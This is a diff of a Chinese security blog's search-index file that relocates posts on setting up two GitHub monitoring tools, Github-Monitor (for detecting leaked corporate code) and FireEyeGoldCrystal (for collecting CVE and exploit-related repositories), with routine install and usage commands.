+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker.io docker-compose -y</span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/VKSRC/Github-Monitor.git</span><br><span class="line"><span class="built_in">cd</span> Github-Monitor</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li>
 </ol>
+<p>搭建错误！！！</p>
 ]]></content>
       <categories>
         <category>工具</category>
@@ -1973,26 +1969,6 @@ Windows服务器防火墙策略:
       </tags>
   </entry>
   <entry>
-    <title>Github-Monitor</title>
-    <url>/2024/03/11/%E5%B7%A5%E5%85%B7Github-Monitor/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Explorer1092/Github-Monitor">Github-Monitor</a></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>GITHUB MONITOR 是vipkid安全研发团队打造的用于监控Github代码仓库的系统。通过该系统可以及时发现企业内部代码泄露、从而降低由于代码泄露导致的一系列安全风险。用户仅需通过简单的任务配置，即可在分钟级发现代码泄露的情况。项目后端使用 django-rest-framework 开发，前端使用 react 和 antd-pro 开发。</p>
-<h2 id="搭建流程："><a href="#搭建流程：" class="headerlink" title="搭建流程："></a>搭建流程：</h2><ol>
-<li><p>阿里云购买Ubuntu 18.04服务器</p>
-</li>
-<li><p>连接服务器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker.io docker-compose -y</span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/VKSRC/Github-Monitor.git</span><br><span class="line"><span class="built_in">cd</span> Github-Monitor</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>搭建错误！！！</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Github监控</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JS Link Finder, JS Miner, HaE和Unexpected.information</title>
     <url>/2024/03/11/%E6%8F%92%E4%BB%B6JS%20Link%20Finder,%20JS%20Miner,%20HaE%E5%92%8CUnexpected.information/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/gh0stkey/HaE">HaE</a><br><a href="https://github.com/ScriptKid-Beta/Unexpected_information">Unexpected_information</a></p>
@@ -2018,6 +1994,30 @@ Windows服务器防火墙策略:
       </categories>
       <tags>
         <tag>JS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>工具FireEyeGoldCrystal</title>
+    <url>/2024/03/12/%E5%B7%A5%E5%85%B7FireEyeGoldCrystal/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/NHPT/FireEyeGoldCrystal">FireEyeGoldCrystal</a></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>火眼金睛是一个GitHub监控和信息收集工具，支持监控和收集CVE、免杀、漏洞利用等内置关键字和自定义关键字。支持钉钉、Server酱和Telegram推送，过滤敏感词，查找包含关键字的所有仓库并输出到FEGC.xlsx文件。默认关键字列表有限，可通过文件指定关键字和敏感词，由于GitHub API速率限制，目前仅实现单线程。</p>
+<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
+<li><p>FireEyeGoldCrystal.py配置关键字列表</p>
+</li>
+<li><p>search.txt写入搜索目标</p>
+</li>
+<li><p>目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FireEyeGoldCrystal.py -h</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目录下会生成表格</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Github监控</tag>
       </tags>
   </entry>
   <entry>
